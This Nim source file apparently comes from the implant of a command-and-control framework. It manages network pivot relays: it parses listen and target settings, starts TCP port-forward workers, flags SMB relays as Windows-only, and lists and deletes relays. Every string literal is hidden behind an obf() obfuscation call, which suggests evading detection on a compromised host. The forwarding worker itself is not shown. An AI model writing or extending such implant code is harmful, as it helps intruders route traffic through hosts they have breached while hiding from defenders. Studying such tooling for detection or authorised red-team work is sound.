import std/json
from std/locks import Lock, initLock, acquire, release
from std/strutils import find, join, strip, toLowerAscii
import std/tables
import ../../utils/global
import ../../utils/general/strings
import ../../utils/linapi/handlers
import ../execution

var
  relays*: Table[string, JsonNode] = initTable[string, JsonNode]()
  relayWorkerTh* = initTable[string, pointer]()
  relayWorkerParked* = initTable[string, bool]()
  relayLock*: Lock
  relayLockReady* = false
  relayTcpStartFn*: proc (relayId: string, cfg: JsonNode, buf: var openArray[char]): int

proc relayCfg*(e: JsonNode): JsonNode =
  # Builds the worker config from a stored relay entry
  %*{
    obf("listenPort"): e[obf("listenPort")],
    obf("channel"): e[obf("mode")],
    obf("destinyRaw"): e[obf("target")],
    obf("destinyKind"): e[obf("destinyKind")],
    obf("destinyScheme"): e[obf("destinyScheme")],
    obf("destinyHost"): e[obf("destinyHost")],
    obf("destinyPort"): e[obf("destinyPort")],
  }

proc relayEnsureLock*() =
  # Initializes the relay lock on the first call
  if not relayLockReady:
    initLock(relayLock)
    relayLockReady = true

proc relayParam*(params: JsonNode, keys: openArray[string]): string =
  # Reads the first non empty param among the given keys
  for key in keys:
    if params.hasKey(key):
      let v = params[key].getStr().strip()
      if v.len > 0:
        return v
  ""

proc relayWinOnly*(buf: var openArray[char]): int =
  # Writes a windows only message into the buffer and returns its length
  let msg = obf("Windows feature only")
  if msg.len > buf.len: return -1
  if msg.len > 0: copyMem(addr buf[0], unsafeAddr msg[0], msg.len)
  msg.len

proc resolveRelayConfig*(params: JsonNode): JsonNode =
  # Parses the relay args and builds the listen and target config
  let argsTable = argsColonTable(relayParam(params, [obf("args")]))
  proc pick(keys: openArray[string]): string =
    # Reads the first matching value from params or from the args table
    for key in keys:
      if params.hasKey(key):
        let v = params[key].getStr().strip()
        if v.len > 0:
          return v
      let lk = key.toLowerAscii()
      if lk in argsTable:
        return argsTable[lk]
    ""

  let listenRaw = pick([obf("listen")])
  let targetRaw = pick([obf("target")])
  if listenRaw.len == 0 or targetRaw.len == 0:
    return newJNull()

  let transport = pick([obf("channel"), obf("mode")]).toLowerAscii()
  if transport == obf("smb"):
    return %*{obf("_winOnly"): true}
  if transport != obf("tcp"):
    return newJNull()

  let listenPort = parsePortInt(listenRaw)
  if listenPort <= 0:
    return newJNull()

  let (destinyKind, targetClean) = targetSchemeParts(targetRaw)
  let endpoint = parseRelayEndpoint(targetClean, transport)
  %*{
    obf("listen"): listenRaw,
    obf("target"): targetRaw,
    obf("targetClean"): targetClean,
    obf("destinyKind"): destinyKind,
    obf("mode"): transport,
    obf("listenPort"): listenPort,
    obf("destinyScheme"): endpoint[obf("scheme")],
    obf("destinyHost"): endpoint[obf("host")],
    obf("destinyPort"): endpoint[obf("port")],
  }

proc relayResolveId*(params, cfg: JsonNode): string =
  # Resolves the relay id from params or from the listen port
  let id = relayParam(params, [obf("id")])
  if id.len > 0:
    return id
  let port = cfg[obf("listenPort")].getInt()
  if port <= 0:
    return ""
  $port

proc relayFindDuplicate*(cfg: JsonNode): string =
  # Finds a running relay with the same listen port and target
  for rid, entry in relays.pairs:
    if not entry[obf("running")].getBool():
      continue
    if entry[obf("listenPort")].getInt() == cfg[obf("listenPort")].getInt() and
       entry[obf("mode")].getStr() == cfg[obf("mode")].getStr():
      return rid
    if entry[obf("target")].getStr() == cfg[obf("target")].getStr() and
       entry[obf("listenPort")].getInt() == cfg[obf("listenPort")].getInt():
      return rid
  ""

proc relayShouldStop*(relayId: string): bool =
  # Checks that the relay is missing or marked to stop
  relayEnsureLock()
  acquire(relayLock)
  defer: release(relayLock)
  not (relayId in relays) or relays[relayId][obf("stop")].getBool()

proc syncActiveRelayPaths*() =
  # Rebuilds the active relay path list from running relays
  activeRelayPaths.setLen(0)
  for _, entry in relays.pairs:
    if not entry[obf("running")].getBool():
      continue
    let mode = entry[obf("mode")].getStr()
    let port = entry[obf("listenPort")].getInt()
    let target = entry[obf("target")].getStr()
    if mode.len == 0 or port <= 0 or target.len == 0:
      continue
    activeRelayPaths.add mode & obf(";") & hostTag & obf(":") & $port & obf(";") & target

proc relayMarkStopped*(relayId: string) =
  # Removes the relay from the table and refreshes the active paths
  relayEnsureLock()
  acquire(relayLock)
  defer: release(relayLock)
  if relayId in relays:
    relays.del(relayId)
  syncActiveRelayPaths()

proc waitRelayParked*(relayId: string) =
  # Waits until the relay worker is parked or the wait limit is reached
  relayEnsureLock()
  acquire(relayLock)
  let hasWorker = relayId in relayWorkerTh and relayWorkerTh[relayId] != nil
  release(relayLock)
  if not hasWorker:
    return
  for _ in 0 ..< 500:
    relayEnsureLock()
    acquire(relayLock)
    let parked = relayWorkerParked.getOrDefault(relayId, true)
    release(relayLock)
    if parked:
      break
    sleepMs(10)

proc run_relay*(_: string; buf: var openArray[char]): int =
  # Prints the status of each stored relay
  try:
    relayEnsureLock()
    acquire(relayLock)
    defer: release(relayLock)
    if relays.len == 0:
      return writeMsg(obf("(empty)\n"), buf)
    const indent = obf("  ")
    const maxValLen = 100
    var blocks: seq[string] = @[]
    for rid, entry in relays.pairs:
      let pairs = @[
        (obf("listen"), entry[obf("listen")].getStr()),
        (obf("target"), entry[obf("target")].getStr()),
        (obf("mode"), entry[obf("mode")].getStr()),
        (obf("status"), if entry[obf("running")].getBool(): obf("running") else: obf("stopping")),
      ]
      var blk = obf("[ ") & rid & obf(" ]\n")
      for p in pairs:
        let v = if p[1].len > maxValLen: p[1][0 ..< maxValLen] & obf("...") else: p[1]
        blk.add indent & p[0] & obf(": ") & v & obf("\n")
      blocks.add blk
    writeMsg(blocks.join(obf("\n\n")), buf)
  except CatchableError as e:
    writeMsg(obf("Error: ") & e.msg, buf)

proc run_relay_create*(params: string; buf: var openArray[char]): int =
  # Main function that creates a relay and starts its worker
  let p = parseJson(params)
  var relayId = ""
  var created = false
  try:
    let cfg = resolveRelayConfig(p)
    if cfg.kind == JsonNodeKind.JNull:
      return writeMsg(obf("Error: invalid relay config (tcp: --channel tcp --listen PORT --target HOST:PORT)"), buf)
    if cfg.hasKey(obf("_winOnly")):
      return relayWinOnly(buf)
    relayId = relayResolveId(p, cfg)
    if relayId.len == 0:
      return writeMsg(obf("Error: invalid listen port in ") & cfg[obf("listen")].getStr(), buf)

    relayEnsureLock()
    acquire(relayLock)
    if relayId in relays and relays[relayId][obf("running")].getBool():
      release(relayLock)
      return writeMsg(obf("Error: relay id '") & relayId & obf("' already exists"), buf)
    let dupId = relayFindDuplicate(cfg)
    if dupId.len > 0:
      release(relayLock)
      return writeMsg(obf("Error: duplicate relay (id=") & dupId & obf(") listen=") & cfg[obf("listen")].getStr() &
        obf(" target=") & cfg[obf("target")].getStr(), buf)
    relays[relayId] = %*{
      obf("id"): relayId,
      obf("listen"): cfg[obf("listen")],
      obf("target"): cfg[obf("target")],
      obf("destinyKind"): cfg[obf("destinyKind")],
      obf("mode"): cfg[obf("mode")],
      obf("listenPort"): cfg[obf("listenPort")],
      obf("destinyScheme"): cfg[obf("destinyScheme")],
      obf("destinyHost"): cfg[obf("destinyHost")],
      obf("destinyPort"): cfg[obf("destinyPort")],
      obf("running"): true,
      obf("stop"): false,
    }
    syncActiveRelayPaths()
    created = true
    release(relayLock)

    let workerCfg = relayCfg(relays[relayId])
    return relayTcpStartFn(relayId, workerCfg, buf)
  except ValueError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeMsg(obf("Error: ") & e.msg, buf)
  except CatchableError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeMsg(obf("Error: ") & e.msg, buf)
  except JsonParsingError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeMsg(obf("Error: invalid JSON - ") & e.msg, buf)

proc run_relay_delete*(params: string; buf: var openArray[char]): int =
  # Removes a relay by id and waits until its worker is parked
  let p = parseJson(params)
  try:
    let relayId = relayParam(p, [obf("id")])
    if relayId.len == 0:
      return writeMsg(obf("Error: missing relay id (--id)"), buf)
    relayEnsureLock()
    acquire(relayLock)
    if relayId notin relays:
      release(relayLock)
      return writeMsg(obf("Error: relay id '") & relayId & obf("' not found"), buf)
    let entry = relays[relayId]
    relays.del(relayId)
    syncActiveRelayPaths()
    release(relayLock)
    waitRelayParked(relayId)
    writeMsg(obf("relay: deleted id=") & relayId & obf(" listen=") & entry[obf("listen")].getStr() &
      obf(" target=") & entry[obf("target")].getStr(), buf)
  except CatchableError as e:
    writeMsg(obf("Error: ") & e.msg, buf)
  except JsonParsingError as e:
    writeMsg(obf("Error: invalid JSON - ") & e.msg, buf)
